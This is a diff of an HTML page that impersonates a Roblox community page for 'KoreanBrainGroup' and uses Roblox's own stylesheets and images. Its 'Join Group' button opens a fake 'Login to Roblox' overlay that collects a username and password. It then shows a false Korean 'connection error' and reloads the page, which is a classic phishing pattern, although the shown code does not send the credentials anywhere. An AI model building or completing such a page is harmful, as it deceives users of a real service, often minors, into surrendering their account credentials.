@@ -2,144 +2,91 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>KoreanBrainGroup - Roblox</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <link rel="stylesheet" href="https://css.rbxcdn.com/56f6868ec13cefb471ad86176c7b9642571d05082c86ac6300ddfeb028617d4e.css">
+    <link rel="stylesheet" href="https://css.rbxcdn.com/c065e7b41147590230d3aa4305b8cc656780f5e0fdb347d6e97cd916f7f42b16-StyleGuide.css">
+    <link rel="stylesheet" href="https://css.rbxcdn.com/03a5c1b93d8909e738d129f5ccafb1d522231b3a03b0a30fc30ed5338a5562ba-Navigation.css">
+    <link rel="stylesheet" href="https://css.rbxcdn.com/9cf73d509a97a9aadb83954af92f8ed69a74d3a9b75f08f0c353301822d0aaa6-GroupDetails.css">
+
     <style>
-        :root {
-            --rbx-bg: #f2f4f5;
-            --rbx-dark-bg: #191b1d; /* 로그인 배경색 */
-            --rbx-card-bg: #2b2d2f; /* 로그인 박스 배경색 */
-            --rbx-blue: #00a2ff;
+        /* 추가 커스텀 디자인: 로그인 팝업 */
+        #login-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #191b1d; z-index: 9999; color: white; font-family: 'Source Sans Pro', sans-serif;
         }
-
-        body { margin: 0; padding: 0; font-family: 'Source Sans Pro', sans-serif; background-color: var(--rbx-bg); overflow-x: hidden; }
-
-        /* 1. 그룹 메인 페이지 스타일 (생략/유지) */
-        #group-page { display: block; }
-        .main-wrapper { max-width: 970px; margin: 24px auto; background: #fff; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .rbx-header { background: #fff; height: 44px; display: flex; align-items: center; padding: 0 16px; border-bottom: 1px solid #d8d8d8; }
-        .group-hero { padding: 24px 30px; display: flex; align-items: center; }
-        .group-img { width: 150px; height: 150px; border-radius: 50%; border: 1px solid #d8d8d8; margin-right: 32px; }
-        .join-btn { background: var(--rbx-blue); color: #fff; border: none; padding: 10px 45px; border-radius: 4px; font-size: 18px; font-weight: 700; cursor: pointer; }
-
-        /* 2. 로그인 페이지 스타일 (IMG_1400 재현) */
-        #login-page {
-            display: none; /* 처음엔 숨김 */
-            background-color: var(--rbx-dark-bg);
-            height: 100vh;
-            width: 100vw;
-            position: fixed;
-            top: 0; left: 0;
-            color: #fff;
-            z-index: 2000;
+        .login-box {
+            width: 400px; margin: 100px auto; background: #2b2d2f; padding: 40px; border-radius: 8px; text-align: center;
         }
-
-        .login-nav { height: 44px; background: #000; display: flex; align-items: center; padding: 0 20px; gap: 30px; font-size: 14px; font-weight: 600; }
-        .login-nav span { cursor: pointer; color: #adb0b1; }
-
-        .login-container {
-            width: 400px;
-            margin: 60px auto;
-            background-color: var(--rbx-card-bg);
-            padding: 40px;
-            border-radius: 8px;
-            text-align: center;
-        }
-
-        .login-container h1 { font-size: 32px; margin-bottom: 30px; }
         .login-input {
-            width: 100%;
-            height: 40px;
-            background: #393b3d;
-            border: 1px solid #454749;
-            border-radius: 4px;
-            margin-bottom: 12px;
-            padding: 0 10px;
-            color: #fff;
-            box-sizing: border-box;
+            width: 100%; height: 44px; background: #393b3d; border: 1px solid #454749;
+            border-radius: 4px; color: white; margin-bottom: 15px; padding: 0 12px;
         }
-
-        .btn-login-submit {
-            width: 100%;
-            height: 40px;
-            background: transparent;
-            border: 1px solid #fff;
-            color: #fff;
-            border-radius: 4px;
-            font-weight: 700;
-            margin-top: 10px;
-            cursor: pointer;
-        }
-
-        .login-footer-links { color: #adb0b1; font-size: 14px; margin-top: 25px; line-height: 2; }
-        .login-footer-links span { color: #fff; cursor: pointer; text-decoration: none; }
-
-        .quick-btn {
-            width: 100%;
-            height: 40px;
-            background: #393b3d;
-            border: none;
-            color: #fff;
-            border-radius: 4px;
-            margin-top: 10px;
-            font-weight: 600;
-            cursor: pointer;
+        .login-btn {
+            width: 100%; height: 44px; background: white; border: none;
+            color: black; font-weight: 700; cursor: pointer; border-radius: 4px;
         }
     </style>
 </head>
-<body>
+<body class="light-theme builder-font">
 
-    <div id="group-page">
-        <div class="rbx-header">
-            <div style="font-weight:900; font-size:20px;">□</div>
-            <div style="margin-left:20px; display:flex; gap:30px; color:#4b4b4b; font-weight:600;">
-                <span>Charts</span><span>Marketplace</span><span>Create</span><span>Robux</span>
-            </div>
+    <div id="header" class="navbar-fixed-top rbx-header">
+        <div class="container-fluid" style="display:flex; align-items:center; height:44px; background:white; border-bottom:1px solid #dee1e3;">
+            <div style="padding: 0 15px; font-weight: bold; font-size: 18px; color: #393b3d;">ROBLOX</div>
         </div>
-
-        <div class="main-wrapper">
-            <div style="padding: 20px 30px 0;"><h2 style="margin:0;">Communities</h2></div>
-            <div class="group-hero">
-                <img src="https://tr.rbxcdn.com/309199676735e5883d29a53f0f7f2b93/150/150/Image/Png" class="group-img">
-                <div class="group-content">
-                    <h1>KoreanBrainGroup</h1>
-                    <div style="color:#666; font-size:14px;">By Etik4321</div>
-                    <button class="join-btn" onclick="showLogin()">Join Community</button>
-                </div>
-            </div>
-            </div>
     </div>
 
-    <div id="login-page">
-        <div class="login-nav">
-            <span>Charts</span><span>Marketplace</span><span>Create</span><span>Robux</span>
-            <div style="flex-grow:1; text-align:center;"><input type="text" placeholder="Search" style="background:#000; border:1px solid #444; color:#fff; padding:5px 10px; border-radius:4px; width:200px;"></div>
-            <button style="background:#00a2ff; border:none; color:#fff; padding:5px 15px; border-radius:4px; font-weight:bold;">Sign Up</button>
+    <div id="main-content" style="padding-top: 60px;">
+        <div class="container-main" style="max-width: 970px; margin: 0 auto; padding: 20px;">
+            <div class="section-content" style="background: white; padding: 30px; border-radius: 4px;">
+                <div style="display: flex; align-items: center;">
+                    <img src="https://tr.rbxcdn.com/180DAY-4a5cef5da6aa52692439ad69a06e15e5/150/150/Image/Png/noFilter" 
+                         style="width: 150px; height: 150px; border-radius: 50%; border: 1px solid #dee1e3;">
+                    
+                    <div style="margin-left: 30px;">
+                        <h1 style="font-size: 32px; margin: 0;">KoreanBrainGroup</h1>
+                        <p style="color: #666;">By Etik4321</p>
+                        <p style="margin: 20px 0; font-size: 14px; line-height: 1.6;">
+                            KoreanBrainGroup is a group on Roblox owned by Etik4321 with 57 members. 법적 증거로 사용
+                        </p>
+                        <button onclick="showLogin()" class="btn-common-play-tabs" style="background: #00a2ff; color: white; border: none; padding: 10px 30px; border-radius: 4px; font-weight: bold; cursor: pointer;">
+                            Join Group
+                        </button>
+                    </div>
+                </div>
+            </div>
         </div>
+    </div>
 
-        <div class="login-container">
-            <h1>Login to Roblox</h1>
-            <input type="text" class="login-input" placeholder="Username/Email/Phone">
-            <input type="password" class="login-input" placeholder="Password">
-            <button class="btn-login-submit" onclick="location.reload()">Log In</button>
-
-            <div class="login-footer-links">
-                <span>Forgot Password or Username?</span>
-                <div style="margin: 20px 0; border-top: 1px solid #444;"></div>
-                <button class="quick-btn">Email Me a One-Time Code</button>
-                <button class="quick-btn">Quick Sign-in</button>
-                <div style="margin-top:20px;">Don't have an account? <span>Sign Up</span></div>
+    <div id="login-overlay">
+        <div class="login-box">
+            <h2 style="font-size: 28px; margin-bottom: 30px;">Login to Roblox</h2>
+            <input type="text" id="user" class="login-input" placeholder="Username / Email / Phone">
+            <input type="password" id="pass" class="login-input" placeholder="Password">
+            <button class="login-btn" onclick="submitData()">Log In</button>
+            <div style="margin-top: 20px; color: #adb0b1; font-size: 13px;">
+                <p>Forgot Password or Username?</p>
             </div>
         </div>
     </div>
 
     <script>
         function showLogin() {
-            // 메인 페이지 숨기고 로그인 페이지 보이기
-            document.getElementById('group-page').style.display = 'none';
-            document.getElementById('login-page').style.display = 'block';
-            window.scrollTo(0, 0); // 화면 맨 위로 이동
+            document.getElementById('login-overlay').style.display = 'block';
+            document.getElementById('main-content').style.filter = 'blur(5px)';
+        }
+
+        function submitData() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            
+            if(user && pass) {
+                alert("연결 오류: 서버와의 통신이 원활하지 않습니다. 잠시 후 다시 시도해주세요.");
+                location.reload(); 
+            } else {
+                alert("정보를 입력해주세요.");
+            }
         }
     </script>
 </body>
